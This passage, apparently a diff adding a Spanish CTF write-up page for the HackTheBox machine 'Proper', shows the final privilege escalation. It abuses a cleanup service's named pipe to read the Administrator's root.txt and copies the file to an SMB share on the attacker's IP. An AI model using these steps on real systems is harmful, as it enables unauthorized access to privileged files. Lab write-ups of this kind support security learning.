+$sw.Write("CLEAN C:\\Users\Administrator\Desktop\root.txt");
+
+# Cerramos objetos
+$sw.Dispose(); 
+$pipe.Dispose();
+</code></pre>
+
+<p>Ejecutamos y obtenemos el archivo:</p>
+
+<pre><code class="language-powershell">PS C:\\Users\web\Videos&gt; dir C:\ProgramData\Cleanup\
+
+    Directory: C:\ProgramData\Cleanup
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----          4/9/2021  25:25 PM            192 QzpcVXNlcnNcQWRtaW5pc3RyYXRvclxEZXNrdG9wXHJvb3QudHh0
+</code></pre>
+
+<p>Nos lo pasamos a nuestra máquina, podemos hacer uso de la carpeta compartida:</p>
+
+<pre><code class="language-powershell">PS C:\\Users\web\Videos&gt; copy C:\ProgramData\Cleanup\QzpcVXNlcnNcQWRtaW5pc3RyYXRvclxEZXNrdG9wXHJvb3QudHh0 \\10.10.14.164\smbFolder\QzpcVXNlcnNcQWRtaW5pc3RyYXRvclxEZXNrdG9wXHJvb3QudHh0
+</code></pre>
+
+<p>Listo, ahora nos lo llevamos a la máquina virtual <strong>Windows</strong> y lo metemos en la ruta <code>C:\ProgramData\Cleanup\</code>:</p>
+
+<pre><code class="language-powershell">PS C:\Program Files\Cleanup&gt; ls C:\ProgramData\Cleanup\
+
+    Directory: C:\ProgramData\Cleanup
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----          4/9/2021  25:25 AM            192 QzpcVXNlcnNcQWRtaW5pc3RyYXRvclxEZXNrdG9wXHJvb3QudHh0
+</code></pre>
+
+<p>Ahora intentamos restaurarlo, peeeeero antes, validamos que la ruta <code>C:\\Users\Administrator\Desktop</code> exista (en mi caso no, la creamos rápidamente):</p>
+
+<pre><code class="language-powershell">PS C:\Program Files\Cleanup&gt; ls -force c:\\Users
+
+    Directory: C:\\Users
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-r---         9/28/2020   1:22 PM                Public
+d-----         3/29/2021   7:32 PM                Varg
+
+PS C:\Program Files\Cleanup&gt; mkdir C:\\Users\Administrator
+PS C:\Program Files\Cleanup&gt; mkdir C:\\Users\Administrator\Desktop
+PS C:\Program Files\Cleanup&gt; ls c:\\Users
+
+    Directory: C:\\Users
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----          4/9/2021  11:43 AM                Administrator
+d-r---         9/28/2020   1:22 PM                Public
+d-----         3/29/2021   7:32 PM                Varg
+
+PS C:\Program Files\Cleanup&gt; ls C:\\Users\Administrator\
+
+    Directory: C:\\Users\Administrator
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----          4/9/2021  11:43 AM                Desktop
+</code></pre>
+
+<p>Ahora si restauramos:</p>
+
+<pre><code class="language-powershell">PS C:\Program Files\Cleanup&gt; .\client.exe -R C:\\Users\Administrator\Desktop\root.txt
+Restoring C:\\Users\Administrator\Desktop\root.txt
+PS C:\Program Files\Cleanup&gt; ls C:\ProgramData\Cleanup\
+PS C:\Program Files\Cleanup&gt; ls C:\\Users\Administrator\Desktop\
+
+    Directory: C:\\Users\Administrator\Desktop
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----          4/9/2021  11:44 AM             34 root.txt
+</code></pre>
+
+<p>😮 <strong>:O</strong> :o <strong>o.O</strong> 😲 O.O ohhh…</p>
+
+<p>Y si vemos su contenido:</p>
+
+<pre><code class="language-powershell">PS C:\Program Files\Cleanup&gt; type C:\\Users\Administrator\Desktop\root.txt
+dd355d81...........................74
+</code></pre>
+
+<p>OPAAAAA, pero claro que si!! Tenemos la flag, por lo tanto podemos leer cualquier archivo del sistema como usuario <strong>Administrator</strong> :O Perfectisimo…</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/proper/321win_root_flag_done.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Intentando generar una reverse Shell de alguna manera (no se me ocurre como) nos quedamos un buen rato pensando, pero nada, no lo logramos, si lo sabes me cuentas y lo agregamos al writeup de UNAAAAAAAAAAAA!!</p>
+
+<p>Hemos terminadooooowowowowowow.</p>
+
+<p>…</p>
+
+<p>Linda linda liiiiinda máquina. Me gusto bastante el camino para llegar al usuario <strong>web</strong>, fantástico el <code>race condition</code> que explotamos para modificar el contenido del archivo <code>header.inc</code> inyectando código <code>PHP</code> mientras el servidor lo busca, na na na, muy lindo.</p>
+
+<p>El pensamiento lateral del <strong>privesc</strong> es increíble.</p>
+
+<p>Muchísimas gracias por leerse otro writeup gigante, pero que espero les sirva tanto como a mí. ¡Y como siempre, a seguir rompiendo!!</p>
+
+</div>
+
+<!-- Rating -->
+
+
+<!-- Author Box if enabled from _config.yml -->
+<!-- Author Box -->
+
+
+
+
+<!-- Comments if not disabled with comments: false -->
+<!-- Comments
+================================================== -->
+ 
+<div class="comments">
+    <button class="btn btn-dark show-comments">Comentarios</button>         
+    <div id="comments">  
+        <h4 class="mb-4">Comments</h4>                 
+            <section class="disqus">
+    <div id="disqus_thread"></div>
+    <script type="text/javascript">
+        var disqus_shortname = 'demowebsite'; 
+        var disqus_developer = 0;
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = window.location.protocol + '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</section>
+     
+    <div class="clearfix"></div>              
+    </div>    
+</div>       
+
+
+<!-- Share -->
+<div class="share">
+    <p>
+        Vacios
+    </p>
+    <ul>
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://twitter.com/intent/tweet?text=HackTheBox - Proper&url=http://localhost:4000/htb/proper" onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+                <i class="fab fa-twitter"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://www.hackthebox.eu/profile/73707" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fas fa-cube"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://github.com/lanzt" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fab fa-github"></i>
+            </a>
+        </li>
+
+    </ul>
+</div>
+
+
+<!-- Related Post -->
+<!-- Related Posts
+================================================== -->
+<div class=" related-posts ">  
+
+    
+    <h2 class="text-center mb-4">Posts relacionados a este (o se hace el intento).</h2>
+    
+    
+    <div class="d-flex justify-content-center align-items-center">
+
+    <!-- Tags -->  
+    
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#RCE">RCE</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#RFI">RFI</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#SQLi">SQLi</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#race-condition">race-condition</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#reversing">reversing</a>               
+    
+    
+    <!-- Categories -->
+    
+    
+    <a class="smoothscroll badge badge-primary" href="/categories#htb">htb</a>                
+    
+
+    </div>
+
+    
+    
+    
+    <div class="blog-grid-container">
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/htb/crimestoppers">
+                
+
+                    
+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120banner.png" alt="HackTheBox - CrimeStoppers"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/htb/crimestoppers">HackTheBox - CrimeStoppers</a>
+                
+            </h2>
+            <h4 class="card-text">Máquina Linux nivel difícil. Explotación web con filtros (wrappers) consiguiendo LFI y RCE, contraseñas de Thunderbird, correos llenos de odio, persistencias locas (un rootkit) y jugueteo entre reversing y criptografía....</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">08 Aug 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/htb/giddy">
+                
+
+                    
+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153banner.png" alt="HackTheBox - Giddy"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/htb/giddy">HackTheBox - Giddy</a>
+                
+            </h2>
+            <h4 class="card-text">Máquina Windows nivel medio. Jugaremos con inyecciones SQL del servicio MSSQL. Pero no vamos dumpear bases de datos, nop, vamos a ejecutar comandos :o que serán interceptados (smbclient y responder)...</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">27 Jul 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/htb/breadcrumbs">
+                
+
+                    
+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/breadcrumbs/316banner.png" alt="HackTheBox - Breadcrumbs"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/htb/breadcrumbs">HackTheBox - Breadcrumbs</a>
+                
+            </h2>
+            <h4 class="card-text">Máquina Windows nivel difícil. Jugaremos mucho con inyecciones y robos :P Encontraremos un LFI, haremos cookie-hijacking, leeremos contraseñas almacenadas, jugando con binarios encontramos una URL que nos llevara de la...</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">17 Jul 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+                
+        </div>        
+</div>
+
+<!-- Review with LD-JSON, adapt it for your needs if you like, but make sure you test the generated HTML source code first: 
+https://search.google.com/structured-data/testing-tool/u/0/
+================================================== -->
+
+    </div>
+
+    
+    <!-- Newsletter
+    ================================================== -->
+    <div class="newsletter text-center">
+        <span class="h4"><img src="/assets/images/sh0x.png" class="newsletter-logo" alt="Sh0x blog"></span>
+        <p></p>
+    </div>
+    
+    
+</div>
+
+<!-- Begin Footer
+================================================== -->
+<footer class="footer">
+    <div class="container">
+        <div class="row">
+            <div class="col-md-6 col-sm-12 text-center text-lg-left">
+                Copyright © 2022 Sh0x blog 
+            </div>
+            <div class="col-md-6 col-sm-12 text-center text-lg-right">    
+                <a target="_blank" href="https://www.wowthemes.net/memoirs-free-jekyll-theme/">Memoirs Jekyll Theme</a> by WowThemes.net
+            </div>
+        </div>
+    </div>
+</footer>
+<!-- End Footer
+================================================== -->
+
+</div> <!-- /.site-content -->
+
+<!-- Scripts (if you need bootstrap.js, please add it yourself. I didn't use it for performance reasons, it was not needed in this theme)
+================================================== -->
+
+<script src="/assets/js/prism.js"></script>
+
+<script src="/assets/js/theme.js"></script>
+
+
+
+
+<script id="dsq-count-scr" src="//demowebsite.disqus.com/count.js"></script>
+
+
+</body>
+</html>
